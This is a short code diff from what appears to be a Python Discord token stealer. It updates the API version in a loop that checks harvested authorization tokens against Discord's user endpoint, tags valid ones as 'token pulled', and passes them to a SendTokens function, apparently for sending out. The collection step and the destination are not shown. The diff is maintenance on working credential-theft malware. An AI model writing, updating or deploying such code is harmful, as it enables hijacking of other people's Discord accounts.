@@ -51,7 +51,7 @@ for check in auth:
 	if check.startswith('\n'):
 		continue
 	else:
-		r = requests.get('https://canary.discordapp.com/api/v9/users/@me', headers = {'Authorization': check}) #update this api url in the future when they actually release v10 for normal members
+		r = requests.get('https://canary.discordapp.com/api/v10/users/@me', headers = {'Authorization': check}) #updated to v10
 	if r.status_code == 200:
 	    auth.append("token pulled:" + check)
 SendTokens(auth)
